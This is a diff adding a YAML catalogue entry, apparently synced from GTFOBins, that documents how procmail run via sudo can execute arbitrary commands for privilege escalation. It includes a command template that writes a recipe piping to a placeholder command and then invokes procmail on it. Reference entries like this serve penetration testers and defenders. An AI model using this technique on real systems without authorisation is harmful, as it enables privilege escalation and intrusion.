@@ -1,0 +1,27 @@
+id: gtfobins/procmail/command/sudo
+type: binary
+platform: linux
+name: procmail
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e '':0\n| /path/to/command >/path/to/temp-file
+
+    procmail -m /path/to/temp-file'
+  comment: The program is picky about the file ownership, and waits for some input.
+references:
+- https://gtfobins.github.io/gtfobins/procmail/
+tags:
+- linux
+- unix
+- gtfobins
